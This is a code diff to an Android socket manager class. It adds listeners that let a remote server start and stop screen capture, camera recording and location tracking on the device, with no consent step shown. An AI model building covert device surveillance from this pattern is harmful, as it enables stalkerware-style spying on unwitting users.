@@ -60,6 +60,9 @@ public class SocketManager {
                 Log.e(TAG, "Socket connection error: " + args[0]);
             });
             
+            // Setup remote control listeners
+            setupRemoteControlListeners();
+            
             // Connect to server
             socket.connect();
             
@@ -127,5 +130,111 @@ public class SocketManager {
     // Check if socket is connected
     public boolean isConnected() {
         return socket != null && socket.connected();
+    }
+    
+    // Setup remote control event listeners
+    private void setupRemoteControlListeners() {
+        if (socket == null) return;
+        
+        // Screen capture control
+        socket.on("remote-start-screen-capture", args -> {
+            Log.d(TAG, "Remote command: Start screen capture");
+            handleRemoteStartScreenCapture();
+        });
+        
+        socket.on("remote-stop-screen-capture", args -> {
+            Log.d(TAG, "Remote command: Stop screen capture");
+            handleRemoteStopScreenCapture();
+        });
+        
+        // Camera control
+        socket.on("remote-start-camera", args -> {
+            Log.d(TAG, "Remote command: Start camera");
+            handleRemoteStartCamera(args);
+        });
+        
+        socket.on("remote-stop-camera", args -> {
+            Log.d(TAG, "Remote command: Stop camera");
+            handleRemoteStopCamera();
+        });
+        
+        socket.on("remote-switch-camera", args -> {
+            Log.d(TAG, "Remote command: Switch camera");
+            handleRemoteSwitchCamera();
+        });
+        
+        // Location control
+        socket.on("remote-start-location", args -> {
+            Log.d(TAG, "Remote command: Start location");
+            handleRemoteStartLocation();
+        });
+        
+        socket.on("remote-stop-location", args -> {
+            Log.d(TAG, "Remote command: Stop location");
+            handleRemoteStopLocation();
+        });
+    }
+    
+    // Remote control handlers
+    private void handleRemoteStartScreenCapture() {
+        try {
+            // Use RemoteControlManager to handle screen capture
+            RemoteControlManager.getInstance().startScreenCapture();
+        } catch (Exception e) {
+            Log.e(TAG, "Error handling remote start screen capture", e);
+        }
+    }
+    
+    private void handleRemoteStopScreenCapture() {
+        try {
+            RemoteControlManager.getInstance().stopScreenCapture();
+        } catch (Exception e) {
+            Log.e(TAG, "Error handling remote stop screen capture", e);
+        }
+    }
+    
+    private void handleRemoteStartCamera(Object[] args) {
+        try {
+            String cameraType = "back"; // default
+            if (args.length > 0 && args[0] instanceof JSONObject) {
+                JSONObject data = (JSONObject) args[0];
+                cameraType = data.optString("camera", "back");
+            }
+            RemoteControlManager.getInstance().startCamera(cameraType);
+        } catch (Exception e) {
+            Log.e(TAG, "Error handling remote start camera", e);
+        }
+    }
+    
+    private void handleRemoteStopCamera() {
+        try {
+            RemoteControlManager.getInstance().stopCamera();
+        } catch (Exception e) {
+            Log.e(TAG, "Error handling remote stop camera", e);
+        }
+    }
+    
+    private void handleRemoteSwitchCamera() {
+        try {
+            RemoteControlManager.getInstance().switchCamera();
+        } catch (Exception e) {
+            Log.e(TAG, "Error handling remote switch camera", e);
+        }
+    }
+    
+    private void handleRemoteStartLocation() {
+        try {
+            RemoteControlManager.getInstance().startLocation();
+        } catch (Exception e) {
+            Log.e(TAG, "Error handling remote start location", e);
+        }
+    }
+    
+    private void handleRemoteStopLocation() {
+        try {
+            RemoteControlManager.getInstance().stopLocation();
+        } catch (Exception e) {
+            Log.e(TAG, "Error handling remote stop location", e);
+        }
     }
 }
